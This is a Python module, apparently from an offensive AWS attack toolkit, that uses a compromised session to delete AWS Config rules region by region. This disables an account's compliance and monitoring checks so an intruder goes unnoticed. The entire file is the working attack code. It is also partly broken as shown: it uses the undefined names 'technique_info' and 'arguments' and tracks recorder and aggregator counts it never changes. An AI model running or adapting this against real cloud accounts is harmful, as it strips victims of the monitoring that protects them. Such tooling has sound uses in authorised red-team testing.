#!/usr/bin/env python3
import datetime

import argparse
from copy import deepcopy


def main(args, awsattack_main):
    session = awsattack_main.get_active_session()
    
    print = awsattack_main.print
    fetch_data = awsattack_main.fetch_data
    get_regions = awsattack_main.get_regions

    config_regions = get_regions('config')

    rules = []

    summary_data = {}

    tmp_config_regions = set()
    if args.config_rules is not None:
        for rule in args.config_rules.split(','):
            name, region = rule.split('@')
            rules.append({
                'ConfigRuleName': name,
                'Region': region
            })
            tmp_config_regions.add(region)

    if len(tmp_config_regions) > 0:
        config_regions = tmp_config_regions

    else:
        config_data = deepcopy(session.Config)
        
        if 'Rules' not in config_data:
            if fetch_data(['Logging/Monitoring Data'], technique_info['prerequisite_modules'][0], ' '.join(arguments)) is False:
                print('Pre-req module not run successfully. Only targeting services that currently have valid data...\n')
            else:
                rules = deepcopy(session.Config['Rules'])
        else:
            rules = config_data['Rules']
    
    if len(rules) > 0:
        print('Starting Config rules...\n')
        summary_data['awsconfig'] = {
            'rules': {
                'deleted': 0,
            },
            'recorders': {
                'deleted': 0,
                'stopped': 0,
            },
            'aggregators': {
                'deleted': 0,
            }
        }

        for region in config_regions:
            print('  Starting region {}...\n'.format(region))

            client = awsattack_main.get_boto3_client('config', region)

            for rule in rules:
                if rule['Region'] == region:
                    action = args.action
                    if action == 'del':
                        try:
                            client.delete_config_rule(
                                ConfigRuleName=rule['ConfigRuleName']
                            )
                            print('        Successfully deleted rule {}!\n'.format(rule['ConfigRuleName']))
                            summary_data['awsconfig']['rules']['deleted'] += 1
                        except Exception as error:
                            print('        Could not delete rule {}:\n          {}\n'.format(rule['ConfigRuleName'], error))
                    else:
                        print('        Skipping rule {}...\n'.format(rule['ConfigRuleName']))
        print('Config rules finished.\n')
    else:
        print('No rules found. Skipping Config rules...\n')

    return summary_data
